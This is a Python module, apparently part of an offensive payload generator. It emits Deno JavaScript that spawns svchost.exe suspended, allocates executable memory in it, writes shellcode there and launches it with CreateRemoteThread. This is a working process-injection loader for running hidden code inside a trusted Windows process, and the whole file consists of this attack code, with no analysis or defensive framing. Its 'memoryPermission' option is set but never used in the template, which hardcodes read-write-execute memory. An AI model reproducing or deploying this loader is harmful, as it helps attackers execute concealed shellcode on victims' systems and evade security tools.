from string import Template

class spawnandinject:
    def __init__(self, arguments):
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'perm' in arguments:
            if arguments['perm'] == 'rwx':
                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return Template("""
    {transformers}

    const si = new Uint8Array(104);
    const pi = new Uint8Array(24);
    const cmdline = Buffer.from('$target', 'utf8');

    {CreateProcessA}(null, cmdline, null, null, 0, 0x4, null, null, si, pi);

    const view = new DataView(pi.buffer);
    const hProcess = view.getBigUint64(0, true);
    const hProc = Deno.UnsafePointer.create(hProcess);

    const address = {VirtualAllocEx}(hProc, null, {shellcodeSize}, 0x3000, 0x40);

    {WriteProcessMemory}(hProc, address, shellcode, {shellcodeSize}, null);
    
    const hThread = {CreateRemoteThread}(hProc, null, 0, address, null, 0, null);
    {WaitForSingleObject}(hThread, 500);
    {CloseHandle}(hProc);
    {CloseHandle}(hThread);

""").substitute(target=self.target, memoryPermission=self.memoryPermission)